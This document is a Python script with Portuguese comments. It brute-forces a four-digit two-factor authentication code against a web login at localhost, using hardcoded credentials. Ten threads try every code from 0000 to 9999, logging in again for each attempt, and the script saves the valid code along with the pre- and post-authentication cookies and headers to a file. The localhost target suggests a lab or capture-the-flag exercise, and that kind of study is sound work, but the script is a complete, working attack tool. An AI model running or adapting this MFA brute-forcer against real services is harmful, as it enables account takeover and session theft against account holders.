import requests
import threading
import time
from queue import Queue

BASE_URL = "http://127.0.0.1:1337"
USERNAME = "windows96"
PASSWORD = "iloveyou2"
OUTPUT_FILE = "mfa.txt"

NUM_THREADS = 10           # número fixo de threads
THROTTLE_DELAY = 0.5       # atraso entre requisições (segundos)
CODE_LIMIT = 10000         # total de códigos (ex: 0000–9999)

found_event = threading.Event()
write_lock = threading.Lock()
task_queue = Queue()

for code in range(CODE_LIMIT):
    task_queue.put(code)

def worker():
    sess = requests.Session()

    while not task_queue.empty() and not found_event.is_set():
        try:
            code = task_queue.get_nowait()
        except:
            break

        try:
            # login
            r = sess.get(BASE_URL + "/login")
            r = sess.post(BASE_URL + "/login", data={"username": USERNAME, "password": PASSWORD}, allow_redirects=False)
            pr_cookie_value = r.cookies.get("pre_auth_token")

            # 2FA
            sess.get(BASE_URL + "/2fa")
            mfa_code = f"{code:04d}"
            r = sess.post(BASE_URL + "/2fa", data={"code": mfa_code}, cookies={"pre_auth_token": pr_cookie_value}, allow_redirects=False)

            print(f"[t{threading.current_thread().name}] try {mfa_code} -> {r.status_code}")

            if "invalid code." not in r.text.lower():
                if '/login' not in r.text:
                    if r.status_code < 500: 
                        cookie_value = r.cookies
                        with write_lock:
                            with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
                                f.write(f"MFA: {mfa_code} | Pre Auth Cookie: {pr_cookie_value} | Post Auth Cokie {cookie_value} | Headers: {r.headers} | {r.raw}\n")
                            with open(f'mfa{mfa_code}.html', 'w', encoding='utf-8') as arq:
                                arq.write(r.text)
                        print(f"[+] Código válido encontrado: {mfa_code}")
                        found_event.set()
                        break

        except requests.RequestException as e:
            print(f"[t{threading.current_thread().name}] erro de rede: {e}")

        finally:
            task_queue.task_done()
            time.sleep(THROTTLE_DELAY)

    sess.close()

# ===== CRIA E INICIA THREADS =====
threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=worker, name=f"T{i}")
    t.start()
    threads.append(t)

# ===== AGUARDA TÉRMINO =====
for t in threads:
    t.join()

print("[*] Execução finalizada.")